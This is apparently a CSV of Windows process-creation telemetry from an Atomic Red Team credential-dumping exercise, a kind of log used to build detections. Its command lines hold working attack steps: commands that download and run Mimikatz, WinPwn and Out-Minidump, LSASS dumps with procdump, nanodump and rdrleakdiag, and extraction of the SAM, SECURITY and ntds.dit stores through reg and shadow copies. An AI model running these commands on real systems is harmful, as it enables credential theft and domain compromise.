guid:ID(Process),pid:int,commandLine,user,name,imagePath
08846768-6d29-68ce-0816-000000000c00,8592,"C:\Windows\system32\cmd.exe /c ""ver""",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d2a-68ce-0916-000000000c00,11380,"""powershell.exe"" & {rundll32.exe keymgr,KRShowKeyMgr}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d2a-68ce-0b16-000000000c00,2536,"""C:\Windows\system32\rundll32.exe"" keymgr,KRShowKeyMgr",DESKTOP-2I19OQ1\test,rundll32.exe,C:\Windows\System32\rundll32.exe
08846768-6d2a-68ce-0c16-000000000c00,13984,"""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\\"""" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d2b-68ce-0e16-000000000c00,7144,"""powershell.exe"" & {rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1>$Null}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d2b-68ce-1016-000000000c00,12004,"""C:\Windows\system32\RpcPing.exe"" -s 127.0.0.1 -e 1234 -a privacy -u NTLM",DESKTOP-2I19OQ1\test,RpcPing.exe,C:\Windows\System32\RpcPing.exe
08846768-6d2c-68ce-1116-000000000c00,7472,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe"" -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d2c-68ce-1316-000000000c00,11400,C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe  -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp,DESKTOP-2I19OQ1\test,procdump.exe,C:\AtomicRedTeam\ExternalPayloads\procdump.exe
08846768-6d2c-68ce-1416-000000000c00,11924,C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe  -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp,DESKTOP-2I19OQ1\test,procdump64.exe,C:\AtomicRedTeam\ExternalPayloads\procdump64.exe
08846768-6d2d-68ce-1516-000000000c00,10020,"""powershell.exe"" & {IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d2e-68ce-1716-000000000c00,9376,"""C:\Windows\system32\notepad.exe"" ",DESKTOP-2I19OQ1\test,notepad.exe,C:\Windows\System32\notepad.exe
08846768-6d34-68ce-1a16-000000000c00,11472,"""powershell.exe"" & {$exePath =  resolve-path \""""$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe\""""
& \""""$exePath\"""" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d34-68ce-1c16-000000000c00,12164,"""C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.17\createdump.exe"" -u -f C:\Users\test\AppData\Local\Temp\dotnet-lsass.dmp 688",DESKTOP-2I19OQ1\test,createdump.exe,C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.17\createdump.exe
08846768-6d34-68ce-1d16-000000000c00,10416,"""powershell.exe"" & {C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d35-68ce-1f16-000000000c00,6072,"""C:\Windows\Temp\xordump.exe"" -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41",DESKTOP-2I19OQ1\test,xordump.exe,C:\Windows\Temp\xordump.exe
08846768-6d35-68ce-2016-000000000c00,10192,"""powershell.exe"" & {if (Test-Path -Path \""""$env:SystemRoot\System32\rdrleakdiag.exe\"""") {
      $binary_path = \""""$env:SystemRoot\System32\rdrleakdiag.exe\""""
  } elseif (Test-Path -Path \""""$env:SystemRoot\SysWOW64\rdrleakdiag.exe\"""") {
      $binary_path = \""""$env:SystemRoot\SysWOW64\rdrleakdiag.exe\""""
  } else {
      $binary_path = \""""File not found\""""
      exit 1
  }
$lsass_pid = get-process lsass |select -expand id
if (-not (Test-Path -Path\""""$env:TEMP\t1003.001-13-rdrleakdiag\"""")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
Write-Host \""""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.\""""}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d35-68ce-2216-000000000c00,10064,"""C:\Windows\System32\rdrleakdiag.exe"" /p 688 /o C:\Users\test\AppData\Local\Temp\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1",DESKTOP-2I19OQ1\test,rdrleakdiag.exe,C:\Windows\System32\rdrleakdiag.exe
08846768-6d35-68ce-2316-000000000c00,13056,"""cmd.exe"" /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ""%%temp%%\SilentProcessExit""",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d35-68ce-2516-000000000c00,1012,"C:\AtomicRedTeam\atomics\..\ExternalPayloads\nanodump.x64.exe  --silent-process-exit ""C:\Users\test\AppData\Local\Temp\SilentProcessExit""",DESKTOP-2I19OQ1\test,nanodump.x64.exe,C:\AtomicRedTeam\ExternalPayloads\nanodump.x64.exe
08846768-6d48-68ce-2a16-000000000c00,11352,C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc,NT AUTHORITY\SYSTEM,svchost.exe,C:\Windows\System32\svchost.exe
08846768-6d95-68ce-2b16-000000000c00,12056,reg  save HKLM\system C:\Users\test\AppData\Local\Temp\system ,DESKTOP-2I19OQ1\test,reg.exe,C:\Windows\system32\reg.exe
08846768-6d95-68ce-2c16-000000000c00,4288,reg  save HKLM\security C:\Users\test\AppData\Local\Temp\security,DESKTOP-2I19OQ1\test,reg.exe,C:\Windows\system32\reg.exe
08846768-6d96-68ce-2d16-000000000c00,12764,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\venv_t1003_002\Scripts\pypykatz"" live lsa",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d97-68ce-2f16-000000000c00,10740,C:\AtomicRedTeam\atomics\..\ExternalPayloads\venv_t1003_002\Scripts\pypykatz  live lsa,DESKTOP-2I19OQ1\test,pypykatz.exe,C:\AtomicRedTeam\ExternalPayloads\venv_t1003_002\Scripts\pypykatz.exe
08846768-6d97-68ce-3016-000000000c00,12180,"""C:\AtomicRedTeam\ExternalPayloads\venv_t1003_002\Scripts\python.exe""  ""C:\AtomicRedTeam\ExternalPayloads\venv_t1003_002\Scripts\pypykatz.exe"" live lsa",DESKTOP-2I19OQ1\test,python.exe,C:\AtomicRedTeam\ExternalPayloads\venv_t1003_002\Scripts\python.exe
08846768-6d97-68ce-3116-000000000c00,3764,"""C:\Program Files\Python310\python.exe"" ""C:\AtomicRedTeam\ExternalPayloads\venv_t1003_002\Scripts\pypykatz.exe"" live lsa",DESKTOP-2I19OQ1\test,python.exe,C:\Program Files\Python310\python.exe
08846768-6d97-68ce-3216-000000000c00,2648,"C:\Windows\system32\cmd.exe /c ""ver""",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d98-68ce-3316-000000000c00,13224,"""cmd.exe"" /c esentutl.exe /y /vss %%SystemRoot%%/system32/config/SAM /d %%temp%%/SAM",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d98-68ce-3516-000000000c00,4712,esentutl.exe  /y /vss C:\Windows/system32/config/SAM /d C:\Users\test\AppData\Local\Temp/SAM,DESKTOP-2I19OQ1\test,esentutl.exe,C:\Windows\System32\esentutl.exe
08846768-6d98-68ce-3616-000000000c00,13552,C:\Windows\system32\vssvc.exe,NT AUTHORITY\SYSTEM,VSSVC.exe,C:\Windows\System32\VSSVC.exe
08846768-6d98-68ce-3816-000000000c00,13880,C:\Windows\system32\svchost.exe -k netsvcs -p -s DsmSvc,NT AUTHORITY\SYSTEM,svchost.exe,C:\Windows\System32\svchost.exe
08846768-6d9b-68ce-3916-000000000c00,13856,"""cmd.exe"" /c mkdir C:\Windows\Temp\ntds_T1003 & ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\ntds_T1003"" q q",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d9b-68ce-3b16-000000000c00,9108,"""cmd.exe"" /c wmic shadowcopy call create Volume=C:\",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d9b-68ce-3d16-000000000c00,3928,wmic  shadowcopy call create Volume=C:\,DESKTOP-2I19OQ1\test,WMIC.exe,C:\Windows\System32\wbem\WMIC.exe
08846768-6d9c-68ce-3e16-000000000c00,4204,"""cmd.exe"" /c wmic /node:""localhost"" shadowcopy call create Volume=C:\",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d9c-68ce-3f16-000000000c00,,,DESKTOP-2I19OQ1\test,conhost.exe,C:\Windows\System32\conhost.exe
08846768-6d9c-68ce-4016-000000000c00,10564,"wmic  /node:""localhost"" shadowcopy call create Volume=C:\",DESKTOP-2I19OQ1\test,WMIC.exe,C:\Windows\System32\wbem\WMIC.exe
08846768-6d9c-68ce-4116-000000000c00,9528,"""powershell.exe"" & {Write-Host \""""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\"""" -fore green
Import-Module \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\PowerDump.ps1\""""
Invoke-PowerDump}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d9d-68ce-4316-000000000c00,13272,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\test\AppData\Local\Temp\ifig3umw\ifig3umw.cmdline""",DESKTOP-2I19OQ1\test,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
08846768-6d9d-68ce-4416-000000000c00,6112,"""cmd.exe"" /c wmic /node:""localhost"" process call create ""cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit""",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d9d-68ce-4616-000000000c00,12660,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\test\AppData\Local\Temp\RES6C78.tmp"" ""c:\Users\test\AppData\Local\Temp\ifig3umw\CSCFB579D3C6C1846328F33B27FEEAE8658.TMP""",DESKTOP-2I19OQ1\test,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
08846768-6d9d-68ce-4716-000000000c00,7296,"wmic  /node:""localhost"" process call create ""cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit""",DESKTOP-2I19OQ1\test,WMIC.exe,C:\Windows\System32\wbem\WMIC.exe
08846768-6d9d-68ce-4916-000000000c00,13524,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\test\AppData\Local\Temp\15znx5on\15znx5on.cmdline""",DESKTOP-2I19OQ1\test,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
08846768-6d9d-68ce-4b16-000000000c00,12816,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\test\AppData\Local\Temp\RES6CE5.tmp"" ""c:\Users\test\AppData\Local\Temp\15znx5on\CSCC2C1BAF3E49B482F9924C120F956EE94.TMP""",DESKTOP-2I19OQ1\test,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
08846768-6d9d-68ce-4d16-000000000c00,6736,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\test\AppData\Local\Temp\itmulx1t\itmulx1t.cmdline""",DESKTOP-2I19OQ1\test,csc.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
08846768-6d9d-68ce-4e16-000000000c00,888,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\test\AppData\Local\Temp\RES6DB1.tmp"" ""c:\Users\test\AppData\Local\Temp\itmulx1t\CSC37E1C0A381E34CE7A34EDB232B8B3C68.TMP""",DESKTOP-2I19OQ1\test,cvtres.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
08846768-6d9d-68ce-4f16-000000000c00,9808,"""powershell.exe"" & {(gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d9d-68ce-5116-000000000c00,9684,"""cmd.exe"" /c for /L %%a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%%a\Windows\System32\config\SAM"" %%temp%%\SAMvss%%a 2 >nul 2>&1) & dir /B %%temp%%\SAMvss*",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d9d-68ce-5316-000000000c00,9220,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"" C:\Users\test\AppData\Local\Temp\SAMvss1 2 ",DESKTOP-2I19OQ1\test,certutil.exe,C:\Windows\System32\certutil.exe
08846768-6d9e-68ce-5416-000000000c00,11884,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM"" C:\Users\test\AppData\Local\Temp\SAMvss2 2 ",DESKTOP-2I19OQ1\test,certutil.exe,C:\Windows\System32\certutil.exe
08846768-6d9e-68ce-5516-000000000c00,11416,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM"" C:\Users\test\AppData\Local\Temp\SAMvss3 2 ",DESKTOP-2I19OQ1\test,certutil.exe,C:\Windows\System32\certutil.exe
08846768-6d9e-68ce-5616-000000000c00,10048,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\Windows\System32\config\SAM"" C:\Users\test\AppData\Local\Temp\SAMvss4 2 ",DESKTOP-2I19OQ1\test,certutil.exe,C:\Windows\System32\certutil.exe
08846768-6d9e-68ce-5716-000000000c00,8116,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\System32\config\SAM"" C:\Users\test\AppData\Local\Temp\SAMvss5 2 ",DESKTOP-2I19OQ1\test,certutil.exe,C:\Windows\System32\certutil.exe
08846768-6d9e-68ce-5816-000000000c00,10948,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy6\Windows\System32\config\SAM"" C:\Users\test\AppData\Local\Temp\SAMvss6 2 ",DESKTOP-2I19OQ1\test,certutil.exe,C:\Windows\System32\certutil.exe
08846768-6d9e-68ce-5916-000000000c00,9592,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\Windows\System32\config\SAM"" C:\Users\test\AppData\Local\Temp\SAMvss7 2 ",DESKTOP-2I19OQ1\test,certutil.exe,C:\Windows\System32\certutil.exe
08846768-6d9e-68ce-5a16-000000000c00,1264,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\Windows\System32\config\SAM"" C:\Users\test\AppData\Local\Temp\SAMvss8 2 ",DESKTOP-2I19OQ1\test,certutil.exe,C:\Windows\System32\certutil.exe
08846768-6d9e-68ce-5b16-000000000c00,12200,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy9\Windows\System32\config\SAM"" C:\Users\test\AppData\Local\Temp\SAMvss9 2 ",DESKTOP-2I19OQ1\test,certutil.exe,C:\Windows\System32\certutil.exe
08846768-6d9e-68ce-5c16-000000000c00,7984,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\Windows\System32\config\SAM"" C:\Users\test\AppData\Local\Temp\SAMvss10 2 ",DESKTOP-2I19OQ1\test,certutil.exe,C:\Windows\System32\certutil.exe
08846768-6d9e-68ce-5d16-000000000c00,10904,"""cmd.exe"" /c vssadmin.exe create shadow /for=C: & mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d9e-68ce-5f16-000000000c00,9704,vssadmin.exe  create shadow /for=C: ,DESKTOP-2I19OQ1\test,vssadmin.exe,C:\Windows\System32\vssadmin.exe
08846768-6d9e-68ce-6016-000000000c00,4364,"""powershell.exe"" & {1..10 | %% { 
 try { [System.IO.File]::Copy(\""""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM\"""" , \""""$env:TEMP\SAMvss$_\"""", \""""true\"""") } catch {}
 ls \""""$env:TEMP\SAMvss$_\"""" -ErrorAction Ignore
}}",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-6d9e-68ce-6216-000000000c00,6060,"""cmd.exe"" /c mkdir c:\exfil & diskshadow.exe /s C:\AtomicRedTeam\atomics\T1003.003\src\diskshadow.txt",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6d9f-68ce-6416-000000000c00,10180,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive}",DESKTOP-2I19OQ1\test,<unknown process>,<unknown process>
08846768-6da2-68ce-6616-000000000c00,9480,"""cmd.exe"" /c reg export HKLM\sam %%temp%%\sam & reg export HKLM\system %%temp%%\system & reg export HKLM\security %%temp%%\security",DESKTOP-2I19OQ1\test,cmd.exe,C:\Windows\System32\cmd.exe
08846768-6da2-68ce-6816-000000000c00,12112,reg  export HKLM\sam C:\Users\test\AppData\Local\Temp\sam ,DESKTOP-2I19OQ1\test,reg.exe,C:\Windows\System32\reg.exe
08846768-6e1a-68ce-6916-000000000c00,5488,reg  export HKLM\system C:\Users\test\AppData\Local\Temp\system ,DESKTOP-2I19OQ1\test,reg.exe,C:\Windows\System32\reg.exe
08846768-6e1a-68ce-6a16-000000000c00,11448,reg  export HKLM\security C:\Users\test\AppData\Local\Temp\security,DESKTOP-2I19OQ1\test,reg.exe,C:\Windows\System32\reg.exe
08846768-7160-68ce-a91a-000000000c00,9900,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command ""Import-Module \""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1\"" -Force; Invoke-AtomicTest T1020"" ",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-7160-68ce-ab1a-000000000c00,10148,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command ""Import-Module \""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1\"" -Force; Invoke-AtomicTest T1021.001"" ",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-7160-68ce-ad1a-000000000c00,13048,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command ""Import-Module \""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1\"" -Force; Invoke-AtomicTest T1021.002"" ",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-7160-68ce-af1a-000000000c00,7276,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command ""Import-Module \""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1\"" -Force; Invoke-AtomicTest T1021.003"" ",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-7160-68ce-b11a-000000000c00,11580,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command ""Import-Module \""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1\"" -Force; Invoke-AtomicTest T1021.004"" ",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-7160-68ce-b31a-000000000c00,11664,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command ""Import-Module \""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1\"" -Force; Invoke-AtomicTest T1021.005"" ",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-7160-68ce-b51a-000000000c00,5604,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command ""Import-Module \""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1\"" -Force; Invoke-AtomicTest T1021.006"" ",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-7160-68ce-b71a-000000000c00,2072,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command ""Import-Module \""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1\"" -Force; Invoke-AtomicTest T1025"" ",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-7161-68ce-b91a-000000000c00,7368,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command ""Import-Module \""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1\"" -Force; Invoke-AtomicTest T1027"" ",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-7161-68ce-bb1a-000000000c00,13664,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command ""Import-Module \""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1\"" -Force; Invoke-AtomicTest T1027.001"" ",DESKTOP-2I19OQ1\test,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
08846768-7162-68ce-bd1a-000000000c00,10420,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-7163-68ce-be1a-000000000c00,8932,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-7163-68ce-bf1a-000000000c00,13828,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-7163-68ce-c01a-000000000c00,9424,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-7163-68ce-c11a-000000000c00,13180,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-7163-68ce-c21a-000000000c00,7096,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-7163-68ce-c31a-000000000c00,13768,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-7163-68ce-c41a-000000000c00,3972,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-7163-68ce-c51a-000000000c00,13624,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-7163-68ce-c61a-000000000c00,724,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-7163-68ce-c71a-000000000c00,2840,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
08846768-7163-68ce-c81a-000000000c00,10812,"""C:\Windows\system32\HOSTNAME.EXE""",DESKTOP-2I19OQ1\test,HOSTNAME.EXE,C:\Windows\System32\HOSTNAME.EXE
